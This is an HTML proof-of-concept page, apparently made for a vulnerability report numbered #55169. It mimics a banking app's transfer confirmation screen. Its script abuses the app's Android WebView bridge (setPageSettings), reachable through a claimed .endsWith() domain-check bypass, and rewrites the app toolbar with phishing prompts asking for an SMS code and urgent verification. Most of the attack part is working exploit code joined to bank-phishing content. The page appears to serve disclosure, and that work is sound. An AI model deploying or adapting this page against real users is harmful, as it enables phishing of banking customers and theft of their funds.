<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Подтверждение перевода</title>
<style>
body { font-family: -apple-system, sans-serif; padding: 16px; background:#fff; }
.logo { color: #EF3124; font-weight: 700; font-size: 28px; margin-bottom: 16px; }
h2 { font-size: 22px; color: #333; }
.warn { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 6px; margin: 12px 0; font-size: 13px; }
.amount { font-size: 36px; color: #EF3124; font-weight: 700; margin: 16px 0; }
.merchant { color: #666; }
button { width: 100%; height: 52px; background: #EF3124; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; margin-top: 12px; }
.log { background: #f5f5f5; padding: 8px; border-radius: 4px; font-size: 10px; margin-top: 16px; word-break: break-all; }
</style>
</head>
<body>
<div class="logo">α-Bank</div>
<h2>Подтверждение операции</h2>
<div class="warn">⚠️ PoC for #55169 — domain notalfabank.ru via .endsWith() bypass. Toolbar title manipulated by JS via setPageSettings bridge.</div>

<div class="amount">−50 000,00 ₽</div>
<div class="merchant">Перевод на карту 4276 ********* 1234</div>
<div class="merchant">Получатель: Иванов Иван Иванович</div>

<button>Подтвердить</button>

<div id="log" class="log">Initializing...</div>

<script>
let log = [];
log.push('Page loaded at ' + new Date().toISOString());
log.push('Bridge presence: ' + (typeof window.Android));

// Manipulate alfa toolbar title via setPageSettings
function setTitleVia(payload) {
    try {
        window.Android.setPageSettings(JSON.stringify(payload));
        log.push('OK: ' + JSON.stringify(payload));
        return true;
    } catch(e) {
        log.push('ERR: ' + e.toString());
        return false;
    }
}

// Sequence: change title over time to demonstrate persistent control
setTitleVia({pageId: 1, pageTitle: "Подтвердите перевод 50000₽"});

setTimeout(() => {
    setTitleVia({pageId: 2, pageTitle: "⚠️ Введите код из СМС ⚠️"});
}, 2000);

setTimeout(() => {
    setTitleVia({pageId: 3, pageTitle: "ВНИМАНИЕ! Срочно требуется верификация"});
}, 4000);

setTimeout(() => {
    setTitleVia({pageId: 4, pageTitle: "ATTACKER CONTROLS ALFA TOOLBAR — #55169"});
}, 6000);

// Update log in DOM
setTimeout(() => {
    document.getElementById('log').innerHTML = log.map(l => '• ' + l).join('<br>');
}, 7000);

document.title = "INJECTED";
</script>
</body>
</html>
